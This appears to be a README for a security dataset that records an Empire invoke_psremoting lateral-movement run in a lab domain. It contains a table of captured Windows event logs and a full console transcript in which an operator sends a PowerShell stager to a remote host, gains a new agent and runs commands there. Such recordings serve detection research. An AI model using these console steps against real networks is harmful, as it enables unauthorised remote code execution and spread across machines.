# Empire Invoke Psremoting

Executes a stager on remote hosts using PSRemoting.

## Technique(s) ID

T1086

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_psremoting.tar.gz](./empire_invoke_psremoting.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18211456

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             850 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |              12 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             288 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             183 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              72 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              35 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |              25 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              23 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              19 |
| Security                                   | Microsoft-Windows-Security-Auditing | User Account Management                                |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              13 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             994 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             795 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             777 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |             383 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             255 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              28 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              25 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              21 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |              19 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              15 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               6 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             721 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | na                                                     |              12 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Connect                                                |               5 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               3 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Stopping Command                                       |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psremoting
(Empire: powershell/lateral_movement/invoke_psremoting) > info

              Name: Invoke-PSRemoting
            Module: powershell/lateral_movement/invoke_psremoting
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PSRemoting.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     True                                  Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psremoting) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psremoting) > execute
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 4
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psremoting
(Empire: powershell/lateral_movement/invoke_psremoting) > [*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent 1NA52YVC checked in
[+] Initial agent 1NA52YVC from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to 1NA52YVC at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_psremoting) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:15:55  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:15:55  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:15:57  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:15:31  https           
 XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:15:57  https           
 1NA52YVC ps 172.18.39.105   IT001             *SHIRE\pgustavo         powershell         6884   5/0.0    2019-05-18 21:15:55  https           


(Empire: agents) > interact 1NA52YVC
(Empire: 1NA52YVC) > shell whoami
[*] Tasked 1NA52YVC to run TASK_SHELL
[*] Agent 1NA52YVC tasked with task ID 1
(Empire: 1NA52YVC) > shire\pgustavo
..Command execution completed.

(Empire: 1NA52YVC) > 
```